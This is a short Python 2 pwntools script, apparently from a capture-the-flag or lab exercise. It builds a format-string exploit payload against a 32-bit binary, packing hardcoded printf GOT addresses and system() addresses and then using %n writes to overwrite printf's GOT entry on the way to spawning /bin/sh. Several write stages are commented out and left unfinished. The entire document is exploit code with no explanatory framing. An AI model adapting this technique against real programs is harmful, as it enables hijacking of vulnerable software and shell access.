from pwn import *
#context.terminal = ['tmux', 'splitw', '-h']


# printf@plt.got = 0x804a00c, Landing
printf_pltgot_1 = 0x804a00c
printf_pltgot_2 = 0x804a00d
printf_pltgot_3 = 0x804a00e
printf_pltgot_4 = 0x804a00f

system1 = 0xf7e04830
system2 = 0xf7e04831
system3 = 0xf7e04832
system4 = 0xf7e04833

pop_ebx1 = 0x08048439
pop_ebx2 = 0x0804843a
pop_ebx3 = 0x0804843b
pop_ebx4 = 0x0804843c

payload = ""

# printf@plt.get = location of payload
payload += p32(printf_pltgot_1)    # 11
payload += p32(printf_pltgot_2)    # 12
payload += p32(printf_pltgot_3)    # 13
payload += p32(printf_pltgot_4)    # 14

# system()
payload += p32(system1) # 23
payload += p32(system2) # 24
payload += p32(system3) # 25
payload += p32(system4) # 26


# 0x08048439 : pop ebx ; ret
# Run over printf@plt.got it will hit this code.
# bytes 11 -14
payload += "%25x"
payload += "%11$n"

payload += "%75x"
payload += "%12$n"

payload += "%1920x"
payload += "%13$n"

#payload += "%x"
#payload += "%14$n"


# '/bin/sh\x00' = 0x6e69622f0068732f
# bytes 15 - 22 bytes

#payload += "%3x"
#payload += "%14$n"


#payload += "%x"
#payload += "%16$n"

#payload += "%x"
#payload += "%17$n"

#payload += "%x"
#payload += "%18$n"

#payload += "%x"
#payload += "%19$n"

#payload += "%x"
#payload += "%20$n"

#payload += "%x"
#payload += "%21$n"

#payload += "%x"
#payload += "%22$n"



# system() = 0xf7e04830
# bytes 23 - 26

#payload += "%x"
#payload += "%23$n"

#payload += "%24x"
#payload += "%24$n"

#payload += "%152x"
#payload += "%25$n"

#payload += "%23x"
#payload += "%26$n"

print payload
